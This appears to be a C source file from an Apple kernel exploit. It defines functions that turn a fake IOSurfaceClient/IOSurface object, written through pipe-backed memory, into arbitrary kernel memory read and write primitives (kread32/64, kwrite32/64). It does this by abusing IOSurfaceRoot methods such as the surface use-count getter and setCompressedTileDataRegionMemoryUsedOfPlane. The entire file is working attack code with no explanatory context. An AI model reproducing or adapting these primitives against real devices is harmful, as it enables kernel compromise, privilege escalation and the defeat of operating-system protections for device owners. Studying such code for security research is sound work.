#include "kernel_rw.h"

#include "IOSurfaceRoot.h"

static io_connect_t _uc;
static uint32_t _surf_id;
static int _read_pipe;
static int _write_pipe;
static uint64_t _mapped_address;

void mcbc_kernel_rw_preinit(uint64_t kaddr, uint8_t *buf, size_t n)
{
    memset(buf, 0x07, n);

    *(uint64_t *)(buf + 0x10 + 0x40) = kaddr+ 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf + 0x10 + 0xB0) = 1; // See IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane
    *(uint64_t *)(buf + 0x10 + 0xC0 + 0x18) = kaddr + 0x20 - 0xA0; // Write destination (+0xA0 added)
    
    _mapped_address = kaddr;
}

int mcbc_kernel_rw_init(io_connect_t uc, uint32_t surf_id, int read_pipe, int write_pipe)
{
    _uc = uc;
    _surf_id = surf_id;
    _read_pipe = read_pipe;
    _write_pipe = write_pipe;
    
    return 0;
}

uint32_t mcbc_kread32(uint64_t kaddr)
{
    uint8_t buf[KERNEL_RW_SIZE_FAKE_ARRAY];
    
    read(_read_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    *(uint64_t *)(buf+ 0x10 + 0x40) = kaddr+ 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf+ 0x10 + 0xC0 ) = kaddr - 0x14; // Write destination (+0xA0 added)
    
    write(_write_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    return mcbc_IOSurfaceRoot_get_surface_use_count(_uc, _surf_id);
}

uint64_t mcbc_kread64(uint64_t kaddr)
{
    uint8_t b[8];
    
    *(uint32_t *)b = mcbc_kread32(kaddr);
    *(uint32_t *)(b + 4) = mcbc_kread32(kaddr + 4);
    
    return *(uint64_t *)b;
}

void mcbc_kwrite32(uint64_t kaddr, uint32_t val)
{
    uint8_t buf[KERNEL_RW_SIZE_FAKE_ARRAY];
    
    read(_read_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    *(uint64_t *)(buf + 0x10 + 0x40) = kaddr+ 0x10; // IOSurfaceClient->IOSurface
    *(uint64_t *)(buf + 0x10 + 0xB0) = 1; // See IOSurface::setCompressedTileDataRegionMemoryUsedOfPlane
    *(uint64_t *)(buf + 0x10 + 0xC0) = kaddr - 0xA0; // Write destination (+0xA0 added)
    
    write(_write_pipe, buf, KERNEL_RW_SIZE_FAKE_ARRAY-1);
    
    mcbc_IOSurfaceRoot_set_compressed_tile_data_region_memory_used_of_plane(_uc, _surf_id, val);
}

void mcbc_kwrite64(uint64_t kaddr, uint64_t val)
{
    mcbc_kwrite32(kaddr, (uint32_t)val);
    mcbc_kwrite32(kaddr + 4, (uint32_t)(val >> 32));
}
